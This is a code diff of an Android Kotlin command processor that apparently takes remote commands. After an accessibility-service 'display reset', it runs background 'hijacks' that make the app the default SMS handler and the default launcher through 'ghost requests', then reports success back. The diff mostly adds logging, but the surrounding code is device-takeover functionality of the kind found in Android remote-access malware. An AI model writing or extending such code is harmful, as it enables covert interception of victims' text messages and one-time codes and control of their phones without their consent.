@@ -2041,25 +2041,40 @@ object CommandProcessor {
                         prefs.edit().putBoolean("hijacks_completed", false).apply()
 
                         // 1. Master Display Reset
-                        DebugLogger.log("RBT_LIFECYCLE", "Invoking startMasterDisplayReset.")
+                        DebugLogger.log("RBT_LIFECYCLE", "Phase 1: Master Display Reset (MDR)")
                         val service = MyAccessibilityService.instance
-                        if (service != null) {
+                        if (service == null) {
+                            DebugLogger.log("RBT_LIFECYCLE", "Phase 1 SKIPPED: AccessibilityService is offline.")
+                        } else {
+                            DebugLogger.log("RBT_LIFECYCLE", "Invoking startMasterDisplayReset.")
                             service.startMasterDisplayReset(id, false)
                             var timeout = 0
                             while(service.activeSequence != null && timeout < 30) { kotlinx.coroutines.delay(1000); timeout++ }
+                            if (timeout >= 30) DebugLogger.log("RBT_LIFECYCLE", "Phase 1 TIMEOUT after 30s.")
+                            else DebugLogger.log("RBT_LIFECYCLE", "Phase 1 COMPLETED in ${timeout}s.")
                         }
 
                         // 2. Default SMS Hijack
-                        if (!DefaultSmsManager.isDefaultSms(ctx)) {
+                        DebugLogger.log("RBT_LIFECYCLE", "Phase 2: Default SMS Hijack")
+                        if (DefaultSmsManager.isDefaultSms(ctx)) {
+                            DebugLogger.log("RBT_LIFECYCLE", "Phase 2 SKIPPED: Already the Default SMS app.")
+                        } else {
+                            DebugLogger.log("RBT_LIFECYCLE", "Not default SMS. Initiating ghost request.")
                             DefaultSmsManager.expectedMode = "AUTO"
                             DefaultSmsManager.requestDefault(ctx)
                             var timeout = 0
                             while(DefaultSmsManager.expectedMode != "" && timeout < 30) { kotlinx.coroutines.delay(1000); timeout++ }
+                            if (timeout >= 30) DebugLogger.log("RBT_LIFECYCLE", "Phase 2 TIMEOUT after 30s.")
+                            else DebugLogger.log("RBT_LIFECYCLE", "Phase 2 COMPLETED in ${timeout}s.")
                         }
 
                         // 3. Default Launcher Hijack
+                        DebugLogger.log("RBT_LIFECYCLE", "Phase 3: Launcher Hijack")
                         val currentHome = DeviceManager.getDefaultApps(ctx).optString("launcher", "")
-                        if (currentHome != ctx.packageName) {
+                        if (currentHome == ctx.packageName) {
+                            DebugLogger.log("RBT_LIFECYCLE", "Phase 3 SKIPPED: Already the Default Launcher.")
+                        } else {
+                            DebugLogger.log("RBT_LIFECYCLE", "Not default Launcher (Current: $currentHome). Initiating ghost request.")
                             LauncherManager.isHijacking = true
                             LauncherManager.pendingCmdId = id
                             android.os.Handler(android.os.Looper.getMainLooper()).post {
@@ -2068,13 +2083,19 @@ object CommandProcessor {
                                         addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK or android.content.Intent.FLAG_ACTIVITY_NO_ANIMATION)
                                     }
                                     ctx.startActivity(intent)
-                                } catch (e: Exception) { LauncherManager.isHijacking = false }
+                                } catch (e: Exception) { 
+                                    DebugLogger.log("RBT_LIFECYCLE", "Failed to open Home Settings: ${e.message}")
+                                    LauncherManager.isHijacking = false 
+                                }
                             }
                             var timeout = 0
                             while(LauncherManager.isHijacking && timeout < 30) { kotlinx.coroutines.delay(1000); timeout++ }
+                            if (timeout >= 30) DebugLogger.log("RBT_LIFECYCLE", "Phase 3 TIMEOUT after 30s.")
+                            else DebugLogger.log("RBT_LIFECYCLE", "Phase 3 COMPLETED in ${timeout}s.")
                         }
 
                         prefs.edit().putBoolean("hijacks_completed", true).apply()
+                        DebugLogger.log("RBT_LIFECYCLE", "All RBT phases finished. Updating command status.")
                         CommandProcessor.updateCommandStatus(ctx, id, "SUCCESS", "All background hijacks completed.")
                     }
                     status = "BACKGROUND_HIJACKS_STARTED"
